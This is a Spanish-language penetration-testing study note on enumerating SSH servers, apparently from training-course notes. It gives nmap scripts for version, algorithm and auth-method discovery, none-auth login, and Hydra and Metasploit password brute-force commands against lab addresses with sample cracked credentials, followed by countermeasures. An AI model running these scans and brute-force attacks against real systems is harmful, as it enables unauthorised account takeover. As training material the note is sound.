# Enumeración SSH (Secure Shell)

## Descripción
SSH (Secure Shell) es un protocolo criptográfico para acceso remoto seguro a sistemas (puerto 22/tcp). La enumeración de SSH incluye: identificar la versión del servidor y sus algoritmos criptograficos soportados, determinar que métodos de autenticación acepta para usuarios especificos, y realizar ataques de fuerza bruta cuando se detecta autenticación por password. Algoritmos debiles (diffie-hellman-group1-sha1, ssh-dss) pueden indicar versiones vulnerables o configuración insegura.

## Clasificación
- **Fase**: Enumeración
- **MITRE ATT&CK**: T1046 (Network Service Discovery) — enumeración del servicio; T1110.001 (Brute Force: Password Guessing) — fuerza bruta de credenciales
- **Plataforma**: Multi
- **Dificultad**: Básica

## Herramientas
- **nmap** (`ssh2-enum-algos`, `ssh-hostkey`, `ssh-auth-methods`) — enumeración pasiva del servicio
- **Hydra** — fuerza bruta de credenciales SSH
- **Metasploit** (`auxiliary/scanner/ssh/ssh_login`) — fuerza bruta con sesion integrada

## Comandos / Ejemplos

### Enumeración con Nmap NSE
```bash
# Deteccion de version del servidor SSH
nmap -sV 192.166.238.3 -p22

# Enumerar algoritmos criptograficos soportados
nmap -sV 192.166.238.3 --script ssh2-enum-algos -p22
# Resultado: listas de kex_algorithms, encryption_algorithms, mac_algorithms
# Algoritmos debiles a buscar: diffie-hellman-group1-sha1, arcfour, 3des-cbc

# Obtener host keys del servidor (RSA, ECDSA, Ed25519)
nmap -sV 192.166.238.3 -p22 --script ssh-hostkey --script-args ssh_hostkey=full

# Enumerar metodos de autenticacion aceptados para un usuario
nmap -sV 192.166.238.3 -p22 --script ssh-auth-methods \
  --script-args="ssh.user=student"
# Resultado posible: "Supported authentication methods: none_auth"
# → si devuelve none_auth, se puede conectar sin contrasena
```

### Conexión sin contraseña (none auth)
```bash
ssh student@192.166.238.3
# Si el metodo es "none_auth", conecta directamente sin pedir contrasena
```

### Fuerza bruta con Hydra
```bash
# Usuario fijo + wordlist de contrasenas
hydra -l student -P /usr/share/wordlists/rockyou.txt 192.49.104.3 ssh
# Resultado: [22][ssh] host: 192.49.104.3 login: student password: friend

# Lista de usuarios + wordlist de contrasenas
hydra -L /usr/share/wordlists/metasploit/common_users.txt \
  -P /usr/share/wordlists/metasploit/unix_passwords.txt \
  192.49.104.3 ssh
```

### Fuerza bruta con Metasploit
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.49.104.3
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
set VERBOSE false
exploit
# Resultado: [+] Success: 'root:attack' → abre sesion de shell
```

**Versión detectada tipica:** `OpenSSH 7.2p2 Ubuntu 4ubuntu2.6`

**Algoritmos seguros vs inseguros:**
| Algoritmo | Estado |
|-----------|--------|
| diffie-hellman-group14-sha256 | Seguro |
| diffie-hellman-group1-sha1 | INSEGURO (Logjam) |
| ssh-ed25519 | Seguro |
| ssh-dss (DSA) | INSEGURO (deprecated) |
| aes256-ctr | Seguro |
| arcfour (RC4) | INSEGURO |

## Contramedidas
- Deshabilitar autenticación por password y usar solo clave publica
- Deshabilitar el acceso root vía SSH (`PermitRootLogin no`)
- Configurar fail2ban o similar para bloquear IPs con múltiples intentos fallidos
- Cambiar el puerto 22 por uno no estándar (seguridad por oscuridad, efecto limitado)
- Desactivar algoritmos criptograficos debiles en `sshd_config`
- Usar SSH con MFA (Multi-Factor Authentication)

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Hertzog, R., & O'Gorman, J. (2017). *Kali Linux Revealed*. Offensive Security.
- MITRE Corporation. (2024). ATT&CK Technique T1110.001: Brute Force: Password Guessing. https://attack.mitre.org/techniques/T1110/001/
- Notas del proyecto: notas-md/INE Courses/INE Courses/Assessment Methodologies Enumeration/SSH/SSH Recon.md
- Notas del proyecto: notas-md/INE Courses/INE Courses/Assessment Methodologies Enumeration/SSH/SSH Dictionary attack.md
